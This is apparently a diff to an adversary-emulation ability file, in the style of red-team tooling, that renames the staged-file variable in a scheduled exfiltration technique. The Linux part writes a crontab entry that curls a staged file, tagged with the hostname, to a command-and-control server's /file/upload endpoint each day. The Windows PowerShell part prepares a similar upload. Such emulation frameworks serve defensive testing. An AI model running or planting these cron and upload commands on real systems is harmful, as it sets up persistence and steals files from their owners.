@@ -11,7 +11,7 @@
         command: |
           crontab -l > /tmp/origcron;
           crontab -l > /tmp/mycron;
-          echo "0 12 * * * curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload" >> /tmp/mycron;
+          echo "0 12 * * * curl -F "data=@#{file.staged_at}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload" >> /tmp/mycron;
           crontab /tmp/mycron;
         cleanup: |
           rm /tmp/mycron;
@@ -20,8 +20,8 @@
     windows:
       psh:
         command: |
-          $commandString = '$fieldName = \"#{host.dir.compress}";
-          $filePath = \"#{host.dir.compress}";
+          $commandString = '$fieldName = \"#{file.staged_at}";
+          $filePath = \"#{file.staged_at}";
           $url = \"#{server}/file/upload\";
           Add-Type -AssemblyName \"System.Net.Http\";
 
